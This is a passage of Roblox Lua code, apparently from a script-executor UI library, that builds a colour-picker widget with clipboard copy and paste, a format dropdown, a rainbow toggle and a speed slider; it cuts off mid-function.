								if data.default and data.default.Color ~= nil then 
									ColorH, ColorS, ColorV = data.default.Color:ToHSV() 

									ColorH = C.CLAMP(ColorH,0,1) 
									ColorS = C.CLAMP(ColorS,0,1) 
									ColorV = C.CLAMP(ColorV,0,1) 
									ColorDrag.Position = C.UDIM2(1-ColorS,0,1-ColorV,0) 
									Colorpick.ImageColor3 = C.COL3HSV(ColorH, 1, 1) 

									ColorP.BackgroundColor3 = C.COL3HSV(ColorH, ColorS, ColorV) 
									Huedrag.Position = C.UDIM2(0, 0, 1-ColorH, -1) 

									values[tabname][sectorname][text] = data.default.Color 
								elseif Element.value.Color ~= nil then
									ColorH, ColorS, ColorV = Element.value.Color:ToHSV() 

									ColorH = C.CLAMP(ColorH,0,1) 
									ColorS = C.CLAMP(ColorS,0,1) 
									ColorV = C.CLAMP(ColorV,0,1) 
									ColorDrag.Position = C.UDIM2(1-ColorS,0,1-ColorV,0) 
									Colorpick.ImageColor3 = C.COL3HSV(ColorH, 1, 1) 

									ColorP.BackgroundColor3 = C.COL3HSV(ColorH, ColorS, ColorV) 
									Huedrag.Position = C.UDIM2(0, 0, 1-ColorH, -1) 

									values[tabname][sectorname][text] = Element.value.Color 
								end

								local mouse = LocalPlayer:GetMouse() 
								game:GetService("UserInputService").InputBegan:Connect(function(input) 
									if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.MouseButton2 then 
										if not dragging and not abc and not inCP then 
											Frame.Visible = false 
										end 
									end 
								end) 

								local function updateColor() 
									local ColorX = (C.CLAMP(mouse.X - Colorpick.AbsolutePosition.X, 0, Colorpick.AbsoluteSize.X)/Colorpick.AbsoluteSize.X) 
									local ColorY = (C.CLAMP(mouse.Y - Colorpick.AbsolutePosition.Y, 0, Colorpick.AbsoluteSize.Y)/Colorpick.AbsoluteSize.Y) 
									ColorDrag.Position = C.UDIM2(ColorX, 0, ColorY, 0) 
									ColorS = 1-ColorX 
									ColorV = 1-ColorY 
									Colorpick.ImageColor3 = C.COL3HSV(ColorH, 1, 1) 
									ColorP.BackgroundColor3 = C.COL3HSV(ColorH, ColorS, ColorV) 
									values[tabname][sectorname][text] = Element.value 
									Element.value.Color = C.COL3HSV(ColorH, ColorS, ColorV) 
									callback(Element.value) 
								end 
								local function updateHue() 
									local y = C.CLAMP(mouse.Y - Huepick.AbsolutePosition.Y, 0, 148) 
									Huedrag.Position = C.UDIM2(0, 0, 0, y) 
									hue = y/148 
									ColorH = 1-hue 
									Colorpick.ImageColor3 = C.COL3HSV(ColorH, 1, 1) 
									ColorP.BackgroundColor3 = C.COL3HSV(ColorH, ColorS, ColorV) 
									values[tabname][sectorname][text] = Element.value 
									Element.value.Color = C.COL3HSV(ColorH, ColorS, ColorV) 
									callback(Element.value) 
								end 
								Colorpick.MouseButton1Down:Connect(function() 
									updateColor() 
									moveconnection = mouse.Move:Connect(function() 
										updateColor() 
									end) 
									releaseconnection = game:GetService("UserInputService").InputEnded:Connect(function(Mouse) 
										if Mouse.UserInputType == Enum.UserInputType.MouseButton1 then 
											updateColor() 
											moveconnection:Disconnect() 
											releaseconnection:Disconnect() 
										end 
									end) 
								end) 
								Huepick.MouseButton1Down:Connect(function() 
									updateHue() 
									moveconnection = mouse.Move:Connect(function() 
										updateHue() 
									end) 
									releaseconnection = game:GetService("UserInputService").InputEnded:Connect(function(Mouse) 
										if Mouse.UserInputType == Enum.UserInputType.MouseButton1 then 
											updateHue() 
											moveconnection:Disconnect() 
											releaseconnection:Disconnect() 
										end 
									end) 
								end) 

								Button.MouseButton1Down:Connect(function() 
									Element.value.Toggle = not Element.value.Toggle 
									update() 
									values[tabname][sectorname][text] = Element.value 
									callback(Element.value) 
								end) 
								if data.default then 
									update() 
								end 
								values[tabname][sectorname][text] = Element.value 
					
								
								function Element:SetValue(value) 
									Element.value = value 
									local duplicate = C.COL3(value.Color.R, value.Color.G, value.Color.B) 
									ColorH, ColorS, ColorV = duplicate:ToHSV() 
									ColorH = C.CLAMP(ColorH,0,1) 
									ColorS = C.CLAMP(ColorS,0,1) 
									ColorV = C.CLAMP(ColorV,0,1) 

									ColorDrag.Position = C.UDIM2(1-ColorS,0,1-ColorV,0) 
									Colorpick.ImageColor3 = C.COL3HSV(ColorH, 1, 1) 
									ColorP.BackgroundColor3 = C.COL3HSV(ColorH, ColorS, ColorV) 
									update() 
									update123()
									Huedrag.Position = C.UDIM2(0, 0, 1-ColorH, -1) 

									callback(value) 
								end
							elseif type == "ToggleTrans" then 
								Section.Size = Section.Size + C.UDIM2(0,0,0,16) 
								Element.value = {Rainbow = false, RainbowSpeed = 3,Toggle = data.default and data.default.Toggle or false, Color = data.default and data.default.Color or C.COL3RGB(255,255,255), Transparency = data.default and data.default.Transparency or 0} 

								local Toggle = C.INST("Frame") 
								local Button = C.INST("TextButton") 
								local Color = C.INST("Frame") 
								local TextLabel = C.INST("TextLabel") 

								Toggle.Name = "Toggle" 
								Toggle.Parent = Inner 
								Toggle.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
								Toggle.BackgroundTransparency = 1.000 
								Toggle.Size = C.UDIM2(1, 0, 0, 15) 

								Button.Name = "Button" 
								Button.Parent = Toggle 
								Button.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
								Button.BackgroundTransparency = 1.000 
								Button.Size = C.UDIM2(1, 0, 1, 0) 
								Button.Font = Enum.Font.SourceSans 
								Button.Text = "" 
								Button.TextColor3 = C.COL3RGB(0, 0, 0) 
								Button.TextSize = 11.000

								Color.Name = "Color" 
								Color.Parent = Button 
								Color.BackgroundColor3 = C.COL3RGB(46, 46, 46) 
								Color.BorderColor3 = C.COL3RGB(18, 18, 16) 
								Color.Position = C.UDIM2(0, 15, 0.5, -5) 
								Color.Size = C.UDIM2(0, 8, 0, 8) 

								TextLabel.Parent = Button 
								TextLabel.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
								TextLabel.BackgroundTransparency = 1.000 
								TextLabel.Position = C.UDIM2(0, 32, 0, -1) 
								TextLabel.Size = C.UDIM2(0.111913361, 208, 1, 0) 
								TextLabel.Font = Enum.Font.Gotham 
								TextLabel.Text = text 
								TextLabel.TextColor3 = C.COL3RGB(200, 200, 200) 
								TextLabel.TextSize = 11.000
								TextLabel.TextXAlignment = Enum.TextXAlignment.Left 

								local function update() 
									if Element.value.Toggle then 
										tween = library:Tween(Color, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundColor3 = MainUIColor}) 
										library:Tween(TextLabel, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = C.COL3RGB(255, 255, 255)}) 
									else 
										tween = library:Tween(Color, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundColor3 = C.COL3RGB(46, 46, 46)}) 
										library:Tween(TextLabel, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = C.COL3RGB(200, 200, 200)}) 
									end 
									values[tabname][sectorname][text] = Element.value 
									callback(Element.value) 
								end 

								local ColorH,ColorS,ColorV 

								local ColorP = C.INST("TextButton") 
								local Frame = C.INST("Frame") 
								local Colorpick = C.INST("ImageButton") 
								local ColorDrag = C.INST("Frame") 
								local Huepick = C.INST("ImageButton") 
								local Huedrag = C.INST("Frame") 

								ColorP.Name = "ColorP" 
								ColorP.Parent = Button 
								ColorP.AnchorPoint = C.Vec2(1, 0) 
								ColorP.BackgroundColor3 = C.COL3RGB(255, 0, 0) 
								ColorP.BorderColor3 = C.COL3RGB(18, 18, 16) 
								ColorP.Position = C.UDIM2(0, 270, 0.5, -4) 
								ColorP.Size = C.UDIM2(0, 18, 0, 8) 
								ColorP.AutoButtonColor = false 
								ColorP.Font = Enum.Font.Gotham 
								ColorP.Text = "" 
								ColorP.TextColor3 = C.COL3RGB(200, 200, 200) 
								ColorP.TextSize = 11.000

								Frame.Parent = ColorP 
								Frame.BackgroundColor3 = C.COL3RGB(46, 46, 46) 
								Frame.BorderColor3 = C.COL3RGB(18, 18, 16) 
								Frame.Position = C.UDIM2(-0.666666687, -170, 1.375, 0) 
								Frame.Size = C.UDIM2(0, 200, 0, 300) --edit here
								Frame.Visible = false 
								Frame.ZIndex = 3 

								local Button5 = C.INST("Frame") 
								local Button_25 = C.INST("TextButton") 
								local TextLabel5 = C.INST("TextLabel") 

								Button5.Name = "Button" 
								Button5.Parent = Frame 
								Button5.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
								Button5.BackgroundTransparency = 1.000 
								Button5.Position = C.UDIM2(0, -20, 0, 190) --edit here
								Button5.Size = C.UDIM2(1, 0, 0, 15) 
								Button5.ZIndex = 3

								Button_25.Name = "Button" 
								Button_25.Parent = Button5
								Button_25.BackgroundColor3 = C.COL3RGB(46, 46, 46) 
								Button_25.BorderColor3 = C.COL3RGB(18, 18, 16) 
								Button_25.Position = C.UDIM2(0, 30, 0.5, -9)
								Button_25.Size = C.UDIM2(0, 175, 0, 18) 
								Button_25.AutoButtonColor = false 
								Button_25.Font = Enum.Font.SourceSans 
								Button_25.Text = "" 
								Button_25.TextColor3 = C.COL3RGB(0, 0, 0) 
								Button_25.TextSize = 11.000
								Button_25.ZIndex = 3

								TextLabel5.Parent = Button_25
								TextLabel5.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
								TextLabel5.BackgroundTransparency = 1.000 
								TextLabel5.BorderColor3 = C.COL3RGB(27, 42, 53) 
								TextLabel5.Size = C.UDIM2(1, 0, 1, 0) 
								TextLabel5.Font = Enum.Font.Gotham 
								TextLabel5.Text = 'Copy colors' 
								TextLabel5.TextColor3 = C.COL3RGB(200, 200, 200) 
								TextLabel5.TextSize = 11.000
								TextLabel5.ZIndex = 3

CopyColorsType = 'RGB'
								Button_25.MouseButton1Down:Connect(function() 
									TextLabel5.TextColor3 = MainUIColor 
									library:Tween(TextLabel5, TweenInfo.new(0.4, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = C.COL3RGB(200, 200, 200)}) 
								local retarded, lmao = pcall(function()
								local l,m,a = C.FLOOR((Element.value.Color.R*255)+0.5),C.FLOOR((Element.value.Color.G*255)+0.5),C.FLOOR((Element.value.Color.B*255)+0.5)
									if CopyColorsType == 'RGB' then
									setclipboard(''..l..','..m..','..a) -- o
									elseif CopyColorsType == 'HEX' then
									setclipboard(toHex(C.COL3RGB(l,m,a)))
									elseif CopyColorsType == 'HSV' then 
									local H,S,V = C.COL3(l,m,a):ToHSV() --hsl, cmyk
									setclipboard(''..H..','..S..','..V)
									end
									end)
									if retarded then
									TextLabel5.Text = 'Success!'
									wait(1.5)
									TextLabel5.Text = 'Copy colors'
									else
																		TextLabel5.Text = 'Error!'
									wait(1.5)
									TextLabel5.Text = 'Copy colors'
									print(lmao)
									print(Element.value.Color)
									print(Element.value.Color.value)
									end
								end) 
								Button_25.MouseEnter:Connect(function() 
									library:Tween(TextLabel5, TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = C.COL3RGB(255, 255, 255)}) 
								end) 
								Button_25.MouseLeave:Connect(function() 
									library:Tween(TextLabel5, TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = C.COL3RGB(200, 200, 200)}) 
								end) 

									do
									--Element.value = {Dropdown = data.options[1]} 

									local Dropdown = C.INST("Frame") 
									local Button = C.INST("TextButton") 
									local TextLabel = C.INST("TextLabel") 
									local Drop = C.INST("ScrollingFrame") 
									local Button_2 = C.INST("TextButton") 
									local TextLabel_2 = C.INST("TextLabel") 
									local UIListLayout = C.INST("UIListLayout") 
									local ImageLabel = C.INST("ImageLabel") 
									local TextLabel_3 = C.INST("TextLabel") 
									--Frame.Size = C.UDIM2(0,200,270)
									Dropdown.Name = "Dropdown" 
									Dropdown.Parent = Frame 
									Dropdown.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
									Dropdown.BackgroundTransparency = 1.000 
									Dropdown.Position = C.UDIM2(0, -20, 0, 208) 
									Dropdown.Size = C.UDIM2(1, 0, 0, 39) 
									Dropdown.ZIndex = 4

									Button.Name = "Button" 
									Button.Parent = Dropdown 
									Button.BackgroundColor3 = C.COL3RGB(46, 46, 46) 
									Button.BorderColor3 = C.COL3RGB(18, 18, 16) 
									Button.Position = C.UDIM2(0, 30, 0, 16) 
									Button.Size = C.UDIM2(0, 175, 0, 17) 
									Button.AutoButtonColor = false 
									Button.Font = Enum.Font.SourceSans 
									Button.Text = "" 
									Button.TextColor3 = C.COL3RGB(0, 0, 0) 
									Button.TextSize = 11.000
									Button.ZIndex = 4

									TextLabel.Parent = Button 
									TextLabel.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
									TextLabel.BackgroundTransparency = 1.000 
									TextLabel.BorderColor3 = C.COL3RGB(27, 42, 53) 
									TextLabel.Position = C.UDIM2(0, 5, 0, 0) 
									TextLabel.Size = C.UDIM2(-0.21714285, 208, 1, 0) 
									TextLabel.Font = Enum.Font.Gotham 
									TextLabel.Text = 'RGB'
									TextLabel.TextColor3 = C.COL3RGB(200, 200, 200) 
									TextLabel.TextSize = 11.000
									TextLabel.TextXAlignment = Enum.TextXAlignment.Left 
									TextLabel.ZIndex = 4

									local abcd = TextLabel 

									Drop.Name = "Drop" 
									Drop.Parent = Button 
									Drop.Active = true 
									Drop.BackgroundColor3 = C.COL3RGB(46, 46, 46) 
									Drop.BorderColor3 = C.COL3RGB(18, 18, 16) 
									Drop.Position = C.UDIM2(0, 0, 1, 1) 
									Drop.Size = C.UDIM2(1, 0, 0, 20) 
									Drop.Visible = false 
									Drop.BottomImage = "http://www.roblox.com/asset/?id=6724808282" 
									Drop.CanvasSize = C.UDIM2(0, 0, 0, 0) 
									Drop.ScrollBarThickness = 4 
									Drop.TopImage = "http://www.roblox.com/asset/?id=6724808282" 
									Drop.MidImage = "http://www.roblox.com/asset/?id=6724808282" 
									Drop.AutomaticCanvasSize = "Y" 
									Drop.ZIndex = 5 
									Drop.ScrollBarImageColor3 = MainUIColor 

									UIListLayout.Parent = Drop 
									UIListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center 
									UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder --DROPDOWN COPY COLORS
									local table = {'RGB', 'HSV', 'HEX'}
									local num = #table 
									if num > 5 then 
										Drop.Size = C.UDIM2(1, 0, 0, 85) 
									else 
										Drop.Size = C.UDIM2(1, 0, 0, 17*num) 
									end 
									local first = true 
									for i,v in ipairs(table) do 
										do 
											local Button = C.INST("TextButton") 
											local TextLabel = C.INST("TextLabel") 

											Button.Name = v 
											Button.Parent = Drop 
											Button.BackgroundColor3 = C.COL3RGB(46, 46, 46) 
											Button.BorderColor3 = C.COL3RGB(18, 18, 16) 
											Button.Position = C.UDIM2(0, 30, 0, 16) 
											Button.Size = C.UDIM2(0, 175, 0, 17) 
											Button.AutoButtonColor = false 
											Button.Font = Enum.Font.SourceSans 
											Button.Text = "" 
											Button.TextColor3 = C.COL3RGB(0, 0, 0) 
											Button.TextSize = 11.000
											Button.BorderSizePixel = 0 
											Button.ZIndex = 6 

											TextLabel.Parent = Button 
											TextLabel.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
											TextLabel.BackgroundTransparency = 1.000 
											TextLabel.BorderColor3 = C.COL3RGB(27, 42, 53) 
											TextLabel.Position = C.UDIM2(0, 5, 0, -1) 
											TextLabel.Size = C.UDIM2(-0.21714285, 208, 1, 0) 
											TextLabel.Font = Enum.Font.Gotham 
											TextLabel.Text = v 
											TextLabel.TextColor3 = C.COL3RGB(200, 200, 200) 
											TextLabel.TextSize = 11.000
											TextLabel.TextXAlignment = Enum.TextXAlignment.Left 
											TextLabel.ZIndex = 6 

											Button.MouseButton1Down:Connect(function() 
												Drop.Visible = false 
												--Element.value.Dropdown = v 
												CopyColorsType = v
												abcd.Text = v 
												--values[tabname][sectorname][text] = Element.value 
												--callback(Element.value) 
												Drop.CanvasPosition = C.Vec2(0,0) 
											end) 
											Button.MouseEnter:Connect(function() 
												library:Tween(TextLabel, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 =  MainUIColor}) 
											end) 
											Button.MouseLeave:Connect(function() 
												library:Tween(TextLabel, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 =  C.COL3RGB(200, 200, 200)}) 
											end) 

											first = false 
										end 
									end

									ImageLabel.Parent = Button 
									ImageLabel.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
									ImageLabel.BackgroundTransparency = 1.000 
									ImageLabel.Position = C.UDIM2(0, 165, 0, 6) 
									ImageLabel.Size = C.UDIM2(0, 6, 0, 4) 
									ImageLabel.Image = "http://www.roblox.com/asset/?id=6724771531" 
									ImageLabel.ZIndex = 4

									TextLabel_3.Parent = Dropdown 
									TextLabel_3.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
									TextLabel_3.BackgroundTransparency = 1.000 
									TextLabel_3.Position = C.UDIM2(0, 32, 0, -1) 
									TextLabel_3.Size = C.UDIM2(0.111913361, 208, 0.382215232, 0) 
									TextLabel_3.Font = Enum.Font.Gotham 
									TextLabel_3.Text = 'Copy colors type' 
									TextLabel_3.TextColor3 = C.COL3RGB(200, 200, 200) 
									TextLabel_3.TextSize = 11.000
									TextLabel_3.TextXAlignment = Enum.TextXAlignment.Left 
									TextLabel_3.ZIndex = 4

									Button.MouseButton1Down:Connect(function() 
										Drop.Visible = not Drop.Visible 
										if not Drop.Visible then 
											Drop.CanvasPosition = C.Vec2(0,0) 
										end 
									end) 
									local indrop = false 
									local ind = false 
									Drop.MouseEnter:Connect(function() 
										indrop = true 
									end) 
									Drop.MouseLeave:Connect(function() 
										indrop = false 
									end) 
									Button.MouseEnter:Connect(function() 
										ind = true 
									end) 
									Button.MouseLeave:Connect(function() 
										ind = false 
									end) 
									game:GetService("UserInputService").InputBegan:Connect(function(input) 
										if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.MouseButton2 then 
											if Drop.Visible == true and not indrop and not ind then 
												Drop.Visible = false 
												Drop.CanvasPosition = C.Vec2(0,0) 
											end 
										end 
									end) 								
								end





								local Button35 = C.INST("Frame") 
								local Button_325 = C.INST("TextButton") 
								local TextLabel35 = C.INST("TextLabel") 

								Button35.Name = "Button" 
								Button35.Parent = Frame 
								Button35.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
								Button35.BackgroundTransparency = 1.000 
								Button35.Position = C.UDIM2(0, -20, 0, 247) --edit here
								Button35.Size = C.UDIM2(1, 0, 0, 15) 
								Button35.ZIndex = 4

								Button_325.Name = "Button" 
								Button_325.Parent = Button35
								Button_325.BackgroundColor3 = C.COL3RGB(46, 46, 46) 
								Button_325.BorderColor3 = C.COL3RGB(18, 18, 16) 
								Button_325.Position = C.UDIM2(0, 30, 0.5, -9) 
								Button_325.Size = C.UDIM2(0, 175, 0, 18) 
								Button_325.AutoButtonColor = false 
								Button_325.Font = Enum.Font.SourceSans 
								Button_325.Text = "" 
								Button_325.TextColor3 = C.COL3RGB(0, 0, 0) 
								Button_325.TextSize = 11.000
								Button_325.ZIndex = 4

								TextLabel35.Parent = Button_325
								TextLabel35.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
								TextLabel35.BackgroundTransparency = 1.000 
								TextLabel35.BorderColor3 = C.COL3RGB(27, 42, 53) 
								TextLabel35.Size = C.UDIM2(1, 0, 1, 0) 
								TextLabel35.Font = Enum.Font.Gotham 
								TextLabel35.Text = 'Paste colors (RGB only)' 
								TextLabel35.TextColor3 = C.COL3RGB(200, 200, 200) 
								TextLabel35.TextSize = 11.000
								TextLabel35.ZIndex = 4

									

									
								Button_325.MouseButton1Down:Connect(function() 
									TextLabel35.TextColor3 = MainUIColor 
									library:Tween(TextLabel35, TweenInfo.new(0.4, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = C.COL3RGB(200, 200, 200)}) 
									local clipboard = getclipboard()
									local colors = string.split(clipboard, ',')
									local IsAColorTable = {'false','false','false'}
									local IsAColor = false
									if #colors == 3 then
										for i = 1, #colors do
											if tonumber(colors[i]) then
												IsAColorTable[i] = 'true'
											end
										end
										if IsAColorTable[1] == 'true' and IsAColorTable[2] == 'true' and IsAColorTable[3] == 'true' then
											IsAColor = true
										end
									else
										IsAColor = false
									end
									
									if IsAColor then
										local retarded, lmao = pcall(function()
												Element.value.Color = C.COL3RGB(colors[1],colors[2],colors[3])
												ColorH, ColorS, ColorV = Element.value.Color:ToHSV() 

												ColorH = C.CLAMP(ColorH,0,1) 
												ColorS = C.CLAMP(ColorS,0,1) 
												ColorV = C.CLAMP(ColorV,0,1) 
												ColorDrag.Position = C.UDIM2(1-ColorS,0,1-ColorV,0) 
												Colorpick.ImageColor3 = C.COL3HSV(ColorH, 1, 1) 

												ColorP.BackgroundColor3 = C.COL3HSV(ColorH, ColorS, ColorV) 
												Huedrag.Position = C.UDIM2(0, 0, 1-ColorH, -1) 
												values[tabname][sectorname][text] = Element.value 
												Element.value.Color = C.COL3HSV(ColorH, ColorS, ColorV) 
												callback(Element.value) 
										end)
											if retarded then
												TextLabel35.Text = 'Success!'
												wait(1.5)
												TextLabel35.Text = 'Paste colors'
											else
												TextLabel35.Text = 'Error!'
												wait(1.5)
												TextLabel35.Text = 'Paste colors'
												print(lmao)
											end
									else
										TextLabel35.Text = 'Not a color'
										wait(1.5)
										TextLabel35.Text = "Paste colors"
									end
								end)
								Button_325.MouseEnter:Connect(function() 
									library:Tween(TextLabel5, TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = C.COL3RGB(255, 255, 255)}) 
								end) 
								Button_325.MouseLeave:Connect(function() 
									library:Tween(TextLabel5, TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = C.COL3RGB(200, 200, 200)}) 
								end)
							
								
								
								
								
								-------------------------------------------------------------------

									local Toggle123 = C.INST("Frame") 
									local Button123 = C.INST("TextButton") 
									local Color123 = C.INST("Frame") 
									local TextLabel123 = C.INST("TextLabel") 							
									Toggle123.Name = "Toggle123" 
									Toggle123.Parent = Frame 
									Toggle123.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
									Toggle123.BackgroundTransparency = 1.000 
									Toggle123.Size = C.UDIM2(1, 0, 0, 15) 
									Toggle123.Position = C.UDIM2(0, -5, 0, 265) --edit here
									Toggle123.ZIndex = 4
									
									--print('it actually spawned')
									
									Button123.Name = "Button123" 
									Button123.Parent = Toggle123 
									Button123.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
									Button123.BackgroundTransparency = 1.000 
									Button123.Size = C.UDIM2(1, 0, 1, 0) 
									Button123.Font = Enum.Font.SourceSans 
									Button123.Text = "" 
									Button123.TextColor3 = C.COL3RGB(0, 0, 0) 
									Button123.TextSize = 11.000
									Button123.ZIndex = 4

									Color123.Name = "Color123" 
									Color123.Parent = Button123
									
									Color123.BackgroundColor3 = MainUIColor 
									
									Color123.BackgroundColor3 = C.COL3RGB(46, 46, 46)
									Color123.BorderColor3 = C.COL3RGB(18, 18, 16) 
									Color123.Position = C.UDIM2(0, 15, 0.5, -5) 
									Color123.Size = C.UDIM2(0, 8, 0, 8) 
									Color123.ZIndex = 4

									TextLabel123.Parent = Button123 
									TextLabel123.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
									TextLabel123.BackgroundTransparency = 1.000 
									TextLabel123.Position = C.UDIM2(0, 32, 0, -1) 
									TextLabel123.Size = C.UDIM2(0.111913361, 208, 1, 0) 
									TextLabel123.Font = Enum.Font.Gotham 
									TextLabel123.Text = "Rainbow" 
									TextLabel123.TextColor3 = C.COL3RGB(200, 200, 200) 
									TextLabel123.TextSize = 11.000
									TextLabel123.TextXAlignment = Enum.TextXAlignment.Left 
									TextLabel123.ZIndex = 4

									local function update123() 
										if Element.value.Rainbow then 
											tween123 = library:Tween(Color123, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundColor3 = MainUIColor}) 
											library:Tween(TextLabel123, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = C.COL3RGB(255, 255, 255)}) 
										else 
											--keybindremove(text, Element.value.Key) 
											tween123 = library:Tween(Color123, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundColor3 = C.COL3RGB(46, 46, 46)}) 
											library:Tween(TextLabel123, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = C.COL3RGB(200, 200, 200)}) 
										end 
										--values[tabname][sectorname][tabtext][text] = Element.value 
									end
									
									Button123.MouseButton1Down:Connect(function() 
										Element.value.Rainbow = not Element.value.Rainbow
										update123() 
									end)
								
											game.RunService.RenderStepped:Connect(function()
												if Element.value.Rainbow then

														ColorH, ColorS, ColorV = tick() % Element.value.RainbowSpeed/Element.value.RainbowSpeed,1,1

														ColorH = C.CLAMP(ColorH,0,1) 
														ColorS = C.CLAMP(ColorS,0,1) 
														ColorV = C.CLAMP(ColorV,0,1)
																							
														ColorDrag.Position = C.UDIM2(1-ColorS,0,1-ColorV,0) 
														Colorpick.ImageColor3 = C.COL3HSV(ColorH, 1, 1) 

														ColorP.BackgroundColor3 = C.COL3HSV(ColorH, ColorS, ColorV) 
														Huedrag.Position = C.UDIM2(0, 0, 1-ColorH, -1) 
														values[tabname][sectorname][text] = Element.value 
														Element.value.Color = C.COL3HSV(ColorH, ColorS, ColorV) 
														callback(Element.value)
																							
																							--library.options['armColor']:SetColor(Color3.fromHSV(i,1,1))
														wait()
																				--        library.options['Accent Color']:SetColor(Color3.fromHSV(i,1,1)) -- also u can change any flag that has color by prinitng flags (table.foreach(library.flags,print)

												end
											end)												
								local Slider2113132 = C.INST("Frame") 
								local TextLabel2113132 = C.INST("TextLabel") 
								local Button2113132 = C.INST("TextButton") 
								local Frame123123 = C.INST("Frame") 
								local UIGradient123123 = C.INST("UIGradient") 
								local Value123123123 = C.INST("TextLabel") 

								Slider2113132.Name = "Slider2113132" 
								Slider2113132.Parent = Frame 
								Slider2113132.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
								Slider2113132.BackgroundTransparency = 1.000 
								Slider2113132.Position = C.UDIM2(0, -15, 0, 277) --edit here
								Slider2113132.Size = C.UDIM2(1, 0, 0, 25) 
								Slider2113132.ZIndex = 3

								TextLabel2113132.Parent = Slider2113132 
								TextLabel2113132.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
								TextLabel2113132.BackgroundTransparency = 1.000 
								TextLabel2113132.Position = C.UDIM2(0, 32, 0, -2) 
								TextLabel2113132.Size = C.UDIM2(0, 100, 0, 15) 
								TextLabel2113132.Font = Enum.Font.Gotham 
								TextLabel2113132.Text = "Rainbow speed" 
								TextLabel2113132.TextColor3 = C.COL3RGB(200, 200, 200) 
								TextLabel2113132.TextSize = 11.000
								TextLabel2113132.TextXAlignment = Enum.TextXAlignment.Left 
								TextLabel2113132.ZIndex = 3

								Button2113132.Name = "Button2113132" 
								Button2113132.Parent = Slider2113132 
								Button2113132.BackgroundColor3 = C.COL3RGB(46, 46, 46) 
								Button2113132.BorderColor3 = C.COL3RGB(18, 18, 16) 
								Button2113132.Position = C.UDIM2(0, 30, 0, 15) 
								Button2113132.Size = C.UDIM2(0, 175, 0, 5) 
								Button2113132.AutoButtonColor = false 
								Button2113132.Font = Enum.Font.SourceSans 
								Button2113132.Text = "" 
								Button2113132.TextColor3 = C.COL3RGB(0, 0, 0) 
								Button2113132.TextSize = 11.000
								Button2113132.ZIndex = 3

								Frame123123.Parent = Button2113132 
								Frame123123.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
								Frame123123.BorderSizePixel = 0 
								Frame123123.Size = C.UDIM2(0.5, 0, 1, 0) 
								Frame123123.ZIndex = 3
								
								UIGradient123123.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, MainUIColor), ColorSequenceKeypoint.new(1.00, C.COL3RGB(75, 92, 112))}
								
								
								UIGradient123123.Rotation = 90
								UIGradient123123.Parent = Frame123123


								Value123123123.Name = "Value123123123" 
								Value123123123.Parent = Slider2113132 
								Value123123123.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
								Value123123123.BackgroundTransparency = 1.000 
								Value123123123.Position = C.UDIM2(0, 30, 0, 15) 
								Value123123123.Size = C.UDIM2(0, 175, 0, 5)  
								Value123123123.Font = Enum.Font.Gotham 
								Value123123123.Text = "50" 
								Value123123123.TextStrokeTransparency = 0.000
								Value123123123.TextColor3 = C.COL3RGB(200, 200, 200) 
								Value123123123.TextSize = 11.000 
								Value123123123.ZIndex = 4
								local min, max, default = 1, 6, 3
								--Element.Value123123123 = {Slider2113132 = default}
								local a
								if min > 0 then 
									a = ((Element.value.RainbowSpeed - min)) / (max-min) 
								else 
									a = (Element.value.RainbowSpeed-min)/(max-min) 
								end 
								Value123123123.Text = default
								Frame123123.Size = C.UDIM2(a,0,1,0) 
								--values[tabname][sectorname][text] = Element.Value123123123 
								local uis = game:GetService('UserInputService')
								local mouse = game.Players.LocalPlayer:GetMouse() 
								local val 
								Button2113132.MouseButton1Down:Connect(function() 
									Frame123123.Size = C.UDIM2(0, C.CLAMP(mouse.X - Frame123123.AbsolutePosition.X, 0, 175), 0, 5) 
									val = C.FLOOR((((tonumber(max) - tonumber(min)) / 175) * Frame123123.AbsoluteSize.X) + tonumber(min)) or 0 
									Value123123123.Text = val 
									Element.value.RainbowSpeed = val 
									--values[tabname][sectorname][text] = Element.Value123123123 
									--callback(Element.Value123123123) 
